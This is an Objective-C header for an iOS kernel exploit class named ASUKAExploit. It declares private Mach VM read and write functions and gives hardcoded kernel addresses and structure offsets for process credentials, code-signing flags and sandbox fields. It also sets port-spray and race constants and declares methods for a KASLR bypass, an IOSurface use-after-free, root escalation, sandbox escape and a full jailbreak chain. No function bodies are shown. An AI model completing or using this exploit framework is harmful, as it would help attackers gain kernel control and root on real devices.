#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
#import <mach/vm_map.h>
#import <sys/sysctl.h>
#import <pthread.h>
#import <dlfcn.h>
#import <sys/utsname.h>
#import <spawn.h>

#ifdef __cplusplus
extern "C" {
#endif

kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, pointer_t,
                            mach_msg_type_number_t);
kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t,
                              boolean_t, vm_prot_t);
kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
                               int);
kern_return_t mach_vm_region(vm_map_t, mach_vm_address_t *, mach_vm_size_t *,
                             vm_region_flavor_t, vm_region_info_t,
                             mach_msg_type_number_t *, mach_port_t *);
kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

#ifdef __cplusplus
}
#endif

#define KTEXT_BASE          0xFFFFFFF007004000ULL
#define KDATA_CONST_BASE    0xFFFFFFF007B80000ULL
#define KDATA_SPTM_BASE     0xFFFFFFF0080C4000ULL
#define KTEXT_EXEC_BASE     0xFFFFFFF008110000ULL
#define KTEXT_BOOT_EXEC     0xFFFFFFF00A98C000ULL
#define KDATA_BASE          0xFFFFFFF00ABD8000ULL
#define KLINKEDIT_BASE      0xFFFFFFF00AE98000ULL

#define SPTM_ENTRY_POINT        0xFFFFFFF00A39910CULL
#define SPTM_STABILITY_FLAG     0xFFFFFFF0079E27E1ULL

#define TASK_BSD_INFO_OFFSET    0x410
#define TASK_ITK_SPACE_OFFSET   0x308
#define PROC_UCRED_OFFSET        0x28
#define PROC_TASK_OFFSET         0x08
#define PROC_CSFLAGS_OFFSET       0x2B8
#define PROC_SANDBOX_OFFSET       0x3C0
#define PROC_PID_OFFSET           0x60
#define UCRED_CR_UID_OFFSET       0x18
#define UCRED_CR_RUID_OFFSET      0x1C
#define UCRED_CR_SVUID_OFFSET     0x20
#define UCRED_CR_GID_OFFSET       0x24
#define UCRED_CR_RGID_OFFSET      0x28
#define IP_KOBJECT_OFFSET         0x50
#define IPC_SPACE_IS_TABLE        0x20

#define GHIDRA_KTASK_GLOBAL      0xFFFFFFF00AC54000ULL
#define GHIDRA_OSVERSION_OID      0xFFFFFFF007BD09B0ULL

#define PROC_ZONE_ID     0x590
#define UCRED_ZONE_ID    0x6A0

#define CS_VALID      0x00000001
#define CS_HARD       0x00000100
#define CS_KILL       0x00000200
#define CS_RESTRICT    0x00000800
#define CS_PLATFORM    0x04000000

#define KADDR_MIN     0xFFFFFFF000000000ULL
#define KADDR_MAX     0xFFFFFFF100000000ULL
#define MAX_SLIDE     0x100000000ULL

#define MAX_OOL_ATTEMPTS       200000
#define MAX_PIPE_ATTEMPTS      200000
#define NUM_SPRAY_PORTS         4096
#define RACE_THREAD_USLEEP      10
#define WATCHDOG_USLEEP          100
#define RACE_ATTEMPTS            1000
#define SYSCTL_RACE_ATTEMPTS     2000

#define ASUKA_PURPLE   [UIColor colorWithRed:0x7B/255.0 green:0x2F/255.0 blue:0xDF/255.0 alpha:1.0]
#define ASUKA_RED      [UIColor colorWithRed:0xE8/255.0 green:0x3A/255.0 blue:0x3A/255.0 alpha:1.0]
#define ASUKA_ORANGE   [UIColor colorWithRed:0xFF/255.0 green:0x6B/255.0 blue:0x35/255.0 alpha:1.0]
#define ASUKA_GREEN    [UIColor colorWithRed:0x00/255.0 green:0xFF/255.0 blue:0x41/255.0 alpha:1.0]
#define ASUKA_BLACK    [UIColor colorWithRed:0x05/255.0 green:0x05/255.0 blue:0x08/255.0 alpha:1.0]
#define ASUKA_DARK_BG  [UIColor colorWithRed:0x0A/255.0 green:0x08/255.0 blue:0x12/255.0 alpha:1.0]

typedef struct {
    volatile mach_vm_address_t page;
    volatile boolean_t running;
    int core;
} sptm_ctx_t;

@interface ASUKAExploit : NSObject

@property (nonatomic, assign) uint64_t slide;
@property (nonatomic, assign) mach_port_t tfp0;
@property (nonatomic, assign) uint64_t procAddr;
@property (nonatomic, assign) uint64_t ucredAddr;
@property (nonatomic, assign) uint32_t origCsflags;
@property (nonatomic, copy) NSString *log;
@property (nonatomic, copy) void (^logCallback)(NSString *);

- (void)appendLog:(NSString *)fmt, ...;
- (BOOL)phaseKASLR;
- (BOOL)phaseSPTMSanityCheck;
- (BOOL)phaseKernelReadTest;
- (BOOL)phaseIOSurfaceUAF;
- (BOOL)phaseFindProc;
- (BOOL)phaseRoot;
- (BOOL)phaseCSFlags;
- (BOOL)phaseSandboxEscape;
- (BOOL)phaseJailbreak;
- (mach_vm_address_t)allocReadonlyPage;
- (void)startSPTM:(mach_vm_address_t)page coreA:(int)ca coreB:(int)cb;
- (void)stopSPTM;
- (void)runFullChain;

@end
